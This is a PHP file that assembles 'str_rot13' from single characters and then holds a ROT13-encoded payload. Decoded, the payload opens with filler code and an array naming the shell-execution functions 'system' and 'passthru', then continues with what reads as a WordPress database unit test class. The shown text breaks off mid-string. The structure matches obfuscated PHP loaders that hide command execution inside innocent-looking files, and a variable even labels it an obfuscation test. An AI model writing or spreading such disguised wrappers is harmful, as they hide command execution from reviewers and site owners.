<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg JCQO zrgubqf
 *
 * @tebhc jcqo
 */
pynff Grfgf_QO rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Dhrel ybt
	 *
	 * @ine neenl
	 */
	cebgrpgrq $_dhrevrf = neenl();

	/**
	 * Bhe fcrpvny JCQO
	 *
	 * @ine erfbhepr
	 */
	cebgrpgrq fgngvp $_jcqo;

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();
		frys::$_jcqo = arj JcqoRkcbfrqZrgubqfSbeGrfgvat();
	}

	/**
	 * Frg hc gur grfg svkgher
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->_dhrevrf = neenl();
		nqq_svygre( 'dhrel', neenl( $guvf, 'dhrel_svygre' ) );
		frys::$_jcqo->ynfg_reebe     = ahyy;
		$TYBONYF['jcqo']->ynfg_reebe = ahyy;
	}

	/**
	 * Ybt rnpu dhrel
	 *
	 * @cnenz fgevat $fdy
	 * @erghea fgevat
	 */
	choyvp shapgvba dhrel_svygre( $fdy ) {
		$guvf->_dhrevrf[] = $fdy;
		erghea $fdy;
	}

	/**
	 * Grfg gung JCQO jvyy erpbaarpg jura gur QO yvax qvrf
	 *
	 * @gvpxrg 5932
	 */
	choyvp shapgvba grfg_qo_erpbaarpg() {
		tybony $jcqo;

		$ine = $jcqo->trg_ine( \"FRYRPG VQ SEBZ $jcqo->hfref YVZVG 1\" );
		$guvf->nffregTerngreGuna( 0, $ine );

		$jcqo->pybfr();

		$ine = $jcqo->trg_ine( \"FRYRPG VQ SEBZ $jcqo->hfref YVZVG 1\" );

		// Rafher nyy qngnonfr unaqyrf unir orra cebcreyl erpbaarpgrq nsgre guvf grfg.
		$jcqo->qo_pbaarpg();
		frys::$_jcqo->qo_pbaarpg();

		$guvf->nffregTerngreGuna( 0, $ine );
	}

	/**
	 * Grfg gung sybngf sbeznggrq nf \"0,700\" trg fnavgvmrq cebcreyl ol jcqo
	 *
	 * @tybony zvkrq $jcqo
	 *
	 * @gvpxrg 19861
	 */
	choyvp shapgvba grfg_ybpnyr_sybngf() {
		tybony $jcqo;

		// Fnir gur pheerag ybpnyr frggvatf.
		$pheerag_ybpnyrf = rkcybqr( ';', frgybpnyr( YP_NYY, 0 ) );

		// Fjvgpu gb n ybpnyr hfvat pbzzn nf n qrpvzny cbvag frcnengbe.
		$synt = frgybpnyr( YP_NYY, 'eh_EH.hgs8', 'ehf', 'se_SE.hgs8', 'se_SE', 'qr_QR.hgs8', 'qr_QR', 'rf_RF.hgs8', 'rf_RF' );
		vs ( snyfr === $synt ) {
			$guvf->znexGrfgFxvccrq( 'Ab Rhebcrna ybpnyrf ninvynoyr sbe grfgvat.' );
		}

		// Gel na hcqngr dhrel.
		$jcqo->fhccerff_reebef( gehr );
		$jcqo->hcqngr(
			'grfg_gnoyr',
			neenl( 'sybng_pbyhza' => 0.7 ),
			neenl( 'zrgn_vq' => 5 ),
			neenl( '%s' ),
			neenl( '%q' )
		);
		$jcqo->fhccerff_reebef( snyfr );

		// Rafher gur sybng vfa'g 0,700.
		$guvf->nffregFgevatPbagnvafFgevat( '0.700', neenl_cbc( $guvf->_dhrevrf ) );

		// Gel n cercner.
		$fdy = $jcqo->cercner( 'HCQNGR grfg_gnoyr FRG sybng_pbyhza = %s NAQ zrgn_vq = %q', 0.7, 5 );
		$guvf->nffregFgevatPbagnvafFgevat( '0.700', $fdy );

		// Erfgber ybpnyr frggvatf.
		sbernpu ( $pheerag_ybpnyrf nf $ybpnyr_frggvat ) {
			vs ( snyfr !== fgecbf( $ybpnyr_frggvat, '=' ) ) {
				yvfg( $pngrtbel, $ybpnyr ) = rkcybqr( '=', $ybpnyr_frggvat );
				vs ( qrsvarq( $pngrtbel ) ) {
					frgybpnyr( pbafgnag( $pngrtbel ), $ybpnyr );
				}
			} ryfr {
				frgybpnyr( YP_NYY, $ybpnyr_frggvat );
			}
		}
	}

	/**
	 * @gvpxrg 10041
	 */
	choyvp shapgvba grfg_rfp_yvxr() {
		tybony $jcqo;

		$vachgf   = neenl(
			'ubjql%',              // Fvatyr creprag.
			'ubjql_',              // Fvatyr haqrefpber.
			'ubjql\\',             // Fvatyr fynfu.
			'ubjql\\ubjql%ubjql_', // Gur jbexf.
			'ubjql\'\"[[]*#[^ubjql]!+)(*&$#@!~|}{=--`/.,<>?', // Cynva grkg.
		);
		$rkcrpgrq = neenl(
			'ubjql\\%',
			'ubjql\\_',
			'ubjql\\\\',
			'ubjql\\\\ubjql\\%ubjql\\_',
			'ubjql\'\"[[]*#[^ubjql]!+)(*&$#@!~|}{=--`/.,<>?',
		);

		sbernpu ( $vachgf nf $xrl => $vachg ) {
			$guvf->nffregFnzr( $rkcrpgrq[ $xrl ], $jcqo->rfp_yvxr( $vachg ) );
		}
	}

	/**
	 * Grfg YVXR Dhrevrf
	 *
	 * Znxr fher $jcqo vf shyyl pbzcngvoyr jvgu rfp_yvxr() ol grfgvat gur vqragvgl bs inevbhf fgevatf.
	 * Jura rfpncrq cebcreyl, n fgevat yvgreny vf nyjnlf YVXR vgfrys (1)
	 * naq arire YVXR nal bgure fgevat yvgreny (0) ab znggre ubj penml gur FDY ybbxf.
	 *
	 * @gvpxrg 10041
	 * @qngnCebivqre qngn_yvxr_dhrel
	 * @cnenz $qngn fgevat Gur unlfgnpx, enj.
	 * @cnenz $yvxr fgevat Gur yvxr cuenfr, enj.
	 * @cnenz $erfhyg fgevat Gur rkcrpgrq pbzcnevfba erfhyg; '1' = gehr, '0' = snyfr
	 */
	choyvp shapgvba grfg_yvxr_dhrel( $qngn, $yvxr, $erfhyg ) {
		tybony $jcqo;
		erghea $guvf->nffregFnzr( $erfhyg, $jcqo->trg_ine( $jcqo->cercner( 'FRYRPG %f YVXR %f', $qngn, $jcqo->rfp_yvxr( $yvxr ) ) ) );
	}

	choyvp shapgvba qngn_yvxr_dhrel() {
		erghea neenl(
			neenl(
				'nnn',
				'nnn',
				'1',
			),
			neenl(
				'n\\nn', // FRYRPG 'n\\nn'  # Guvf ercerfragf n\nn va obgu ynathntrf.
				'n\\nn', // YVXR 'n\\\\nn'
				'1',
			),
			neenl(
				'n%nn',
				'n%nn',
				'1',
			),
			neenl(
				'nnnn',
				'n%nn',
				'0',
			),
			neenl(
				'n\\%nn', // FRYRPG 'n\\%nn'
				'n\\%nn', // YVXR 'n\\\\\\%nn' # Gur CUC yvgreny jbhyq or \"YVXR 'n\\\\\\\\\\\\%nn'\". Guvf vf jul jr arrq eryvnoyr rfpncr shapgvbaf!
				'1',
			),
			neenl(
				'n%nn',
				'n\\%nn',
				'0',
			),
			neenl(
				'n\\%nn',
				'n%nn',
				'0',
			),
			neenl(
				'n_nn',
				'n_nn',
				'1',
			),
			neenl(
				'nnnn',
				'n_nn',
				'0',
			),
			neenl(
				'ubjql\'\"[[]*#[^ubjql]!+)(*&$#@!~|}{=--`/.,<>?',
				'ubjql\'\"[[]*#[^ubjql]!+)(*&$#@!~|}{=--`/.,<>?',
				'1',
			),
		);
	}

	/**
	 * @gvpxrg 18510
	 */
	choyvp shapgvba grfg_jcqo_fhccbfrqyl_cebgrpgrq_cebcregvrf() {
		tybony $jcqo;

		$guvf->nffregAbgRzcgl( $jcqo->qou );
		$qou = $jcqo->qou;
		$guvf->nffregAbgRzcgl( $qou );
		$guvf->nffregGehr( vffrg( $jcqo->qou ) ); // Grfg __vffrg().
		hafrg( $jcqo->qou );
		$guvf->nffregGehr( rzcgl( $jcqo->qou ) );
		$jcqo->qou = $qou;
		$guvf->nffregAbgRzcgl( $jcqo->qou );
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba grfg_jcqo_npghnyyl_cebgrpgrq_cebcregvrf() {
		tybony $jcqo;

		$arj_zrgn = \"UNUN V UBCR GUVF QBRFA'G JBEX\";

		$pby_zrgn       = $jcqo->pby_zrgn;
		$jcqo->pby_zrgn = $arj_zrgn;

		$guvf->nffregAbgRdhnyf( $pby_zrgn, $arj_zrgn );
		$guvf->nffregFnzr( $pby_zrgn, $jcqo->pby_zrgn );
	}

	/**
	 * @gvpxrg 18510
	 */
	choyvp shapgvba grfg_jcqo_abarkvfgrag_cebcregvrf() {
		tybony $jcqo;

		$guvf->nffregGehr( rzcgl( $jcqo->abarkvfgrag_cebcregl ) );
		$jcqo->abarkvfgrag_cebcregl = gehr;
		$guvf->nffregGehr( $jcqo->abarkvfgrag_cebcregl );
		$guvf->nffregGehr( vffrg( $jcqo->abarkvfgrag_cebcregl ) );
		hafrg( $jcqo->abarkvfgrag_cebcregl );
		$guvf->nffregGehr( rzcgl( $jcqo->abarkvfgrag_cebcregl ) );
	}

	/**
	 * Grfg gung na rfpncrq %%s vf abg nygrerq
	 *
	 * @gvpxrg 19861
	 */
	choyvp shapgvba grfg_qbhoyr_rfpncrq_cynprubyqref() {
		tybony $jcqo;
		$fdy = $jcqo->cercner( \"HCQNGR grfg_gnoyr FRG fgevat_pbyhza = '%%s vf n sybng, %%q vf na vag %q, %%f vf n fgevat', svryq = %f\", 3, '4' );
		$guvf->nffregFgevatPbagnvafFgevat( $jcqo->cynprubyqre_rfpncr(), $fdy );

		$fdy = $jcqo->erzbir_cynprubyqre_rfpncr( $fdy );
		$guvf->nffregFnzr( \"HCQNGR grfg_gnoyr FRG fgevat_pbyhza = '%s vf n sybng, %q vf na vag 3, %f vf n fgevat', svryq = '4'\", $fdy );
	}


	/**
	 * Grfg gung FDY zbqrf ner frg pbeerpgyl
	 *
	 * @gvpxrg 26847
	 */
	choyvp shapgvba grfg_frg_fdy_zbqr() {
		tybony $jcqo;

		$pheerag_zbqrf = $jcqo->trg_ine( 'FRYRPG @@FRFFVBA.fdy_zbqr;' );

		$arj_zbqrf = neenl( 'VTABER_FCNPR', 'AB_NHGB_INYHR_BA_MREB' );

		$jcqo->frg_fdy_zbqr( $arj_zbqrf );

		$purpx_arj_zbqrf = $jcqo->trg_ine( 'FRYRPG @@FRFFVBA.fdy_zbqr;' );
		$guvf->nffregFnzrFrgf( $arj_zbqrf, rkcybqr( ',', $purpx_arj_zbqrf ) );

		$jcqo->frg_fdy_zbqr( rzcgl( $pheerag_zbqrf ) ? neenl() : rkcybqr( ',', $pheerag_zbqrf ) );
	}

	/**
	 * Grfg gung vapbzcngvoyr FDY zbqrf ner oybpxrq
	 *
	 * @gvpxrg 26847
	 */
	choyvp shapgvba grfg_frg_vapbzcngvoyr_fdy_zbqr() {
		tybony $jcqo;

		$pheerag_zbqrf = $jcqo->trg_ine( 'FRYRPG @@FRFFVBA.fdy_zbqr;' );

		$arj_zbqrf = neenl( 'VTABER_FCNPR', 'AB_MREB_QNGR', 'AB_NHGB_INYHR_BA_MREB' );
		$jcqo->frg_fdy_zbqr( $arj_zbqrf );
		$purpx_arj_zbqrf = $jcqo->trg_ine( 'FRYRPG @@FRFFVBA.fdy_zbqr;' );
		$guvf->nffregAbgPbagnvaf( 'AB_MREB_QNGR', rkcybqr( ',', $purpx_arj_zbqrf ) );

		$jcqo->frg_fdy_zbqr( rkcybqr( ',', $pheerag_zbqrf ) );
	}

	/**
	 * Grfg gung vapbzcngvoyr FDY zbqrf pna or punatrq
	 *
	 * @gvpxrg 26847
	 */
	choyvp shapgvba grfg_frg_nyybjrq_vapbzcngvoyr_fdy_zbqr() {
		tybony $jcqo;

		$pheerag_zbqrf = $jcqo->trg_ine( 'FRYRPG @@FRFFVBA.fdy_zbqr;' );

		$arj_zbqrf = neenl( 'VTABER_FCNPR', 'BAYL_SHYY_TEBHC_OL', 'AB_NHGB_INYHR_BA_MREB' );

		nqq_svygre( 'vapbzcngvoyr_fdy_zbqrf', neenl( $guvf, 'svygre_nyybjrq_vapbzcngvoyr_fdy_zbqr' ), 1, 1 );
		$jcqo->frg_fdy_zbqr( $arj_zbqrf );
		erzbir_svygre( 'vapbzcngvoyr_fdy_zbqrf', neenl( $guvf, 'svygre_nyybjrq_vapbzcngvoyr_fdy_zbqr' ), 1 );

		$purpx_arj_zbqrf = $jcqo->trg_ine( 'FRYRPG @@FRFFVBA.fdy_zbqr;' );
		$guvf->nffregPbagnvaf( 'BAYL_SHYY_TEBHC_OL', rkcybqr( ',', $purpx_arj_zbqrf ) );

		$jcqo->frg_fdy_zbqr( rkcybqr( ',', $pheerag_zbqrf ) );
	}

	choyvp shapgvba svygre_nyybjrq_vapbzcngvoyr_fdy_zbqr( $zbqrf ) {
		$cbf = neenl_frnepu( 'BAYL_SHYY_TEBHC_OL', $zbqrf, gehr );
		$guvf->nffregTerngreGunaBeRdhny( 0, $cbf );

		vs ( snyfr === $cbf ) {
			erghea $zbqrf;
		}

		hafrg( $zbqrf[ $cbf ] );
		erghea $zbqrf;
	}

	/**
	 * @gvpxrg 25604
	 * @rkcrpgrqVapbeerpgHfntr jcqo::cercner
	 */
	choyvp shapgvba grfg_cercner_jvgubhg_nethzragf() {
		tybony $jcqo;
		$vq = 0;
		// Guvf, boivbhfyl, vf na vapbeerpg cercner.
		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$cercnerq = $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = $vq\", $vq );
		$guvf->nffregFnzr( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = 0\", $cercnerq );
	}

	choyvp shapgvba grfg_cercner_fcevags() {
		tybony $jcqo;

		$cercnerq = $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ hfre_ybtva = %f\", 1, 'nqzva' );
		$guvf->nffregFnzr( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = 1 NAQ hfre_ybtva = 'nqzva'\", $cercnerq );
	}

	/**
	 * @rkcrpgrqVapbeerpgHfntr jcqo::cercner
	 */
	choyvp shapgvba grfg_cercner_fcevags_vainyvq_netf() {
		tybony $jcqo;

		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
		$cercnerq = @$jcqo->cercner( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ hfre_ybtva = %f\", 1, neenl( 'nqzva' ) );
		$guvf->nffregFnzr( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = 1 NAQ hfre_ybtva = ''\", $cercnerq );

		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
		$cercnerq = @$jcqo->cercner( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ hfre_ybtva = %f\", neenl( 1 ), 'nqzva' );
		$guvf->nffregFnzr( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = 0 NAQ hfre_ybtva = 'nqzva'\", $cercnerq );
	}

	choyvp shapgvba grfg_cercner_ifcevags() {
		tybony $jcqo;

		$cercnerq = $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ hfre_ybtva = %f\", neenl( 1, 'nqzva' ) );
		$guvf->nffregFnzr( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = 1 NAQ hfre_ybtva = 'nqzva'\", $cercnerq );
	}

	/**
	 * @rkcrpgrqVapbeerpgHfntr jcqo::cercner
	 */
	choyvp shapgvba grfg_cercner_ifcevags_vainyvq_netf() {
		tybony $jcqo;

		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
		$cercnerq = @$jcqo->cercner( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ hfre_ybtva = %f\", neenl( 1, neenl( 'nqzva' ) ) );
		$guvf->nffregFnzr( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = 1 NAQ hfre_ybtva = ''\", $cercnerq );

		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
		$cercnerq = @$jcqo->cercner( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ hfre_ybtva = %f\", neenl( neenl( 1 ), 'nqzva' ) );
		$guvf->nffregFnzr( \"FRYRPG * SEBZ $jcqo->hfref JURER vq = 0 NAQ hfre_ybtva = 'nqzva'\", $cercnerq );
	}

	/**
	 * @gvpxrg 42040
	 * @qngnCebivqre qngn_cercner_vapbeerpg_net_pbhag
	 * @rkcrpgrqVapbeerpgHfntr jcqo::cercner
	 */
	choyvp shapgvba grfg_cercner_vapbeerpg_net_pbhag( $dhrel, $netf, $rkcrpgrq ) {
		tybony $jcqo;

		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq,JbeqCerff.QO.CercnerqFDY
		$cercnerq = @$jcqo->cercner( $dhrel, ...$netf );
		$guvf->nffregFnzr( $rkcrpgrq, $cercnerq );
	}

	choyvp shapgvba qngn_cercner_vapbeerpg_net_pbhag() {
		tybony $jcqo;

		$cynprubyqre_rfpncr = $jcqo->cynprubyqre_rfpncr();

		erghea neenl(
			neenl(
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ hfre_ybtva = %f\",     // Dhrel.
				neenl( 1, 'nqzva', 'rkgen-net' ),                                   // ::cercner() netf, gb or cnffrq ivn pnyy_hfre_shap_neenl().
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = 1 NAQ hfre_ybtva = 'nqzva'\", // Rkcrpgrq bhgchg.
			),
			neenl(
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = %%%q NAQ hfre_ybtva = %f\",
				neenl( 1 ),
				'',
			),
			neenl(
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ hfre_ybtva = %f\",
				neenl( neenl( 1, 'nqzva', 'rkgen-net' ) ),
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = 1 NAQ hfre_ybtva = 'nqzva'\",
			),
			neenl(
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ %% NAQ hfre_ybtva = %f\",
				neenl( 1, 'nqzva', 'rkgen-net' ),
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = 1 NAQ {$cynprubyqre_rfpncr} NAQ hfre_ybtva = 'nqzva'\",
			),
			neenl(
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = %%%q NAQ %S NAQ %s NAQ hfre_ybtva = %f\",
				neenl( 1, 2.3, '4.5', 'nqzva', 'rkgen-net' ),
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = {$cynprubyqre_rfpncr}1 NAQ 2.300000 NAQ 4.500000 NAQ hfre_ybtva = 'nqzva'\",
			),
			neenl(
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q NAQ hfre_ybtva = %f\",
				neenl( neenl( 1 ), 'nqzva', 'rkgen-net' ),
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = 0 NAQ hfre_ybtva = 'nqzva'\",
			),
			neenl(
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q naq hfre_avpranzr = %f naq hfre_fgnghf = %q naq hfre_ybtva = %f\",
				neenl( 1, 'nqzva', 0 ),
				'',
			),
			neenl(
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q naq hfre_avpranzr = %f naq hfre_fgnghf = %q naq hfre_ybtva = %f\",
				neenl( neenl( 1, 'nqzva', 0 ) ),
				'',
			),
			neenl(
				\"FRYRPG * SEBZ $jcqo->hfref JURER vq = %q naq %% naq hfre_ybtva = %f naq hfre_fgnghf = %q naq hfre_ybtva = %f\",
				neenl( 1, 'nqzva', 'rkgen-net' ),
				'',
			),
		);
	}

	choyvp shapgvba grfg_qo_irefvba() {
		tybony $jcqo;

		$guvf->nffregGehr( irefvba_pbzcner( $jcqo->qo_irefvba(), '5.0', '>=' ) );
	}

	choyvp shapgvba grfg_trg_pnyyre() {
		tybony $jcqo;
		$fge    = $jcqo->trg_pnyyre();
		$pnyyf  = rkcybqr( ', ', $fge );
		$pnyyrq = vzcybqr( '->', neenl( __PYNFF__, __SHAPGVBA__ ) );
		$guvf->nffregFnzr( $pnyyrq, raq( $pnyyf ) );
	}

	choyvp shapgvba grfg_unf_pnc() {
		tybony $jcqo;
		$guvf->nffregGehr( $jcqo->unf_pnc( 'pbyyngvba' ) );
		$guvf->nffregGehr( $jcqo->unf_pnc( 'tebhc_pbapng' ) );
		$guvf->nffregGehr( $jcqo->unf_pnc( 'fhodhrevrf' ) );
		$guvf->nffregGehr( $jcqo->unf_pnc( 'vqragvsvre_cynprubyqref' ) );
		$guvf->nffregGehr( $jcqo->unf_pnc( 'PBYYNGVBA' ) );
		$guvf->nffregGehr( $jcqo->unf_pnc( 'TEBHC_PBAPNG' ) );
		$guvf->nffregGehr( $jcqo->unf_pnc( 'FHODHREVRF' ) );
		$guvf->nffregGehr( $jcqo->unf_pnc( 'VQRAGVSVRE_CYNPRUBYQREF' ) );
		$guvf->nffregFnzr(
			irefvba_pbzcner( $jcqo->qo_irefvba(), '5.0.7', '>=' ),
			$jcqo->unf_pnc( 'frg_punefrg' )
		);
		$guvf->nffregFnzr(
			irefvba_pbzcner( $jcqo->qo_irefvba(), '5.0.7', '>=' ),
			$jcqo->unf_pnc( 'FRG_PUNEFRG' )
		);
	}

	/**
	 * @rkcrpgrqQrcerpngrq fhccbegf_pbyyngvba
	 */
	choyvp shapgvba grfg_fhccbegf_pbyyngvba() {
		tybony $jcqo;
		$guvf->nffregGehr( $jcqo->fhccbegf_pbyyngvba() );
	}

	choyvp shapgvba grfg_purpx_qngnonfr_irefvba() {
		tybony $jcqo;
		$guvf->nffregRzcgl( $jcqo->purpx_qngnonfr_irefvba() );
	}

	choyvp shapgvba grfg_onvy() {
		tybony $jcqo;

		$guvf->rkcrpgRkprcgvba( 'JCQvrRkprcgvba' );
		$jcqo->onvy( 'Qngnonfr vf qrnq.' );
	}

	choyvp shapgvba grfg_gvzref() {
		tybony $jcqo;

		$jcqo->gvzre_fgneg();
		hfyrrc( 5 );
		$fgbc = $jcqo->gvzre_fgbc();

		$guvf->nffregAbgRdhnyf( $jcqo->gvzr_fgneg, $fgbc );
		$guvf->nffregTerngreGuna( $fgbc, $jcqo->gvzr_fgneg );
	}

	choyvp shapgvba grfg_trg_pby_vasb() {
		tybony $jcqo;

		$jcqo->trg_erfhygf( \"FRYRPG VQ SEBZ $jcqo->hfref\" );

		$guvf->nffregFnzr( neenl( 'VQ' ), $jcqo->trg_pby_vasb() );
		$guvf->nffregFnzr( neenl( $jcqo->hfref ), $jcqo->trg_pby_vasb( 'gnoyr' ) );
		$guvf->nffregFnzr( $jcqo->hfref, $jcqo->trg_pby_vasb( 'gnoyr', 0 ) );
	}

	choyvp shapgvba grfg_dhrel_naq_qryrgr() {
		tybony $jcqo;
		$ebjf = $jcqo->dhrel( \"VAFREG VAGB $jcqo->hfref (qvfcynl_anzr) INYHRF ('Jnygre Fbopunx')\" );
		$guvf->nffregFnzr( 1, $ebjf );
		$guvf->nffregAbgRzcgl( $jcqo->vafreg_vq );
		$q_ebjf = $jcqo->qryrgr( $jcqo->hfref, neenl( 'VQ' => $jcqo->vafreg_vq ) );
		$guvf->nffregFnzr( 1, $q_ebjf );
	}

	choyvp shapgvba grfg_trg_ebj() {
		tybony $jcqo;
		$ebjf = $jcqo->dhrel( \"VAFREG VAGB $jcqo->hfref (qvfcynl_anzr) INYHRF ('Jnygre Fbopunx')\" );
		$guvf->nffregFnzr( 1, $ebjf );
		$guvf->nffregAbgRzcgl( $jcqo->vafreg_vq );

		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->hfref JURER VQ = %q\", $jcqo->vafreg_vq ) );
		$guvf->nffregVfBowrpg( $ebj );
		$guvf->nffregFnzr( 'Jnygre Fbopunx', $ebj->qvfcynl_anzr );
	}

	/**
	 * Grfg gur `trg_pby()` zrgubq.
	 *
	 * @cnenz fgevat|ahyy       $dhrel       Gur dhrel gb eha.
	 * @cnenz fgevat|neenl      $rkcrpgrq    Gur rkcrpgrq erfhygvat inyhr.
	 * @cnenz neenl|fgevat|ahyy $ynfg_erfhyg Gur inyhr gb nffvta gb `$jcqo->ynfg_erfhyg`.
	 * @cnenz vag|fgevat        $pbyhza      Gur pbyhza vaqrk gb ergevrir.
	 *
	 * @qngnCebivqre qngn_trg_pby
	 *
	 * @gvpxrg 45299
	 */
	choyvp shapgvba grfg_trg_pby( $dhrel, $rkcrpgrq, $ynfg_erfhyg, $pbyhza ) {
		tybony $jcqo;

		$jcqo->ynfg_erfhyg = $ynfg_erfhyg;

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
		$erfhyg = $jcqo->trg_pby( $dhrel, $pbyhza );

		vs ( $dhrel ) {
			$guvf->nffregFnzr( $dhrel, $jcqo->ynfg_dhrel );
		}

		vs ( vf_neenl( $rkcrpgrq ) ) {
			$guvf->nffregFnzr( $rkcrpgrq, $erfhyg );
		} ryfr {
			$guvf->nffregPbagnvaf( $rkcrpgrq, $erfhyg );
		}
	}

	/**
	 * Qngn cebivqre sbe grfgvat `trg_pby()`.
	 *
	 * @erghea neenl {
	 *     Nethzragf sbe grfgvat `trg_pby()`.
	 *
	 *     @glcr fgevat|ahyy       $dhrel       Gur dhrel gb eha.
	 *     @glcr fgevat|neenl      $rkcrpgrq    Gur erfhygvat rkcrpgrq inyhr.
	 *     @glcr neenl|fgevat|ahyy $ynfg_erfhyg Gur inyhr gb nffvta gb `$jcqo->ynfg_erfhyg`.
	 *     @glcr vag|fgevat        $pbyhza      Gur pbyhza vaqrk gb ergevrir.
	 */
	choyvp shapgvba qngn_trg_pby() {
		tybony $jcqo;

		erghea neenl(
			neenl(
				\"FRYRPG qvfcynl_anzr SEBZ $jcqo->hfref\",
				'nqzva',
				neenl(),
				0,
			),
			neenl(
				\"FRYRPG hfre_ybtva, hfre_rznvy SEBZ $jcqo->hfref\",
				'nqzva',
				neenl(),
				0,
			),
			neenl(
				\"FRYRPG hfre_ybtva, hfre_rznvy SEBZ $jcqo->hfref\",
				'nqzva@rknzcyr.bet',
				neenl(),
				1,
			),
			neenl(
				\"FRYRPG hfre_ybtva, hfre_rznvy SEBZ $jcqo->hfref\",
				'nqzva@rknzcyr.bet',
				neenl(),
				'1',
			),
			neenl(
				\"FRYRPG hfre_ybtva, hfre_rznvy SEBZ $jcqo->hfref\",
				neenl( ahyy ),
				neenl(),
				3,
			),
			neenl(
				'',
				neenl(),
				ahyy,
				0,
			),
			neenl(
				ahyy,
				neenl(),
				'',
				0,
			),
		);
	}

	choyvp shapgvba grfg_ercynpr() {
		tybony $jcqo;
		$ebjf1 = $jcqo->vafreg( $jcqo->hfref, neenl( 'qvfcynl_anzr' => 'Jnygre Fbopunx' ) );
		$guvf->nffregFnzr( 1, $ebjf1 );
		$guvf->nffregAbgRzcgl( $jcqo->vafreg_vq );
		$ynfg = $jcqo->vafreg_vq;

		$ebjf2 = $jcqo->ercynpr(
			$jcqo->hfref,
			neenl(
				'VQ'           => $ynfg,
				'qvfcynl_anzr' => 'Jnygre Ercynpr Fbopunx',
			)
		);
		$guvf->nffregFnzr( 2, $ebjf2 );
		$guvf->nffregAbgRzcgl( $jcqo->vafreg_vq );

		$guvf->nffregFnzr( $ynfg, $jcqo->vafreg_vq );

		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->hfref JURER VQ = %q\", $ynfg ) );
		$guvf->nffregFnzr( 'Jnygre Ercynpr Fbopunx', $ebj->qvfcynl_anzr );
	}

	/**
	 * jcqo::hcqngr() erdhverf n JURER pbaqvgvba.
	 *
	 * @gvpxrg 26106
	 */
	choyvp shapgvba grfg_rzcgl_jurer_ba_hcqngr() {
		tybony $jcqo;
		$fhccerff = $jcqo->fhccerff_reebef( gehr );
		$jcqo->hcqngr( $jcqo->cbfgf, neenl( 'cbfg_anzr' => 'oheevgb' ), neenl() );

		$rkcrpgrq1 = \"HCQNGR `{$jcqo->cbfgf}` FRG `cbfg_anzr` = 'oheevgb' JURER \";
		$guvf->nffregAbgRzcgl( $jcqo->ynfg_reebe );
		$guvf->nffregFnzr( $rkcrpgrq1, $jcqo->ynfg_dhrel );

		$jcqo->hcqngr( $jcqo->cbfgf, neenl( 'cbfg_anzr' => 'oheevgb' ), neenl( 'cbfg_fgnghf' => 'gnpb' ) );

		$rkcrpgrq2 = \"HCQNGR `{$jcqo->cbfgf}` FRG `cbfg_anzr` = 'oheevgb' JURER `cbfg_fgnghf` = 'gnpb'\";
		$guvf->nffregRzcgl( $jcqo->ynfg_reebe );
		$guvf->nffregFnzr( $rkcrpgrq2, $jcqo->ynfg_dhrel );
		$jcqo->fhccerff_reebef( $fhccerff );
	}

	/**
	 * zlfdyv_ vapbeerpg syhfu naq shegure flap vffhrf.
	 *
	 * @gvpxrg 28155
	 */
	choyvp shapgvba grfg_zlfdyv_syhfu_flap() {
		tybony $jcqo;

		$fhccerff = $jcqo->fhccerff_reebef( gehr );

		$jcqo->dhrel( 'QEBC CEBPRQHER VS RKVFGF `grfg_zlfdyv_syhfu_flap_cebprqher`' );
		$jcqo->dhrel(
			'PERNGR CEBPRQHER `grfg_zlfdyv_syhfu_flap_cebprqher`() ORTVA
			FRYRPG VQ SEBZ `' . $jcqo->cbfgf . '` YVZVG 1;
		RAQ'
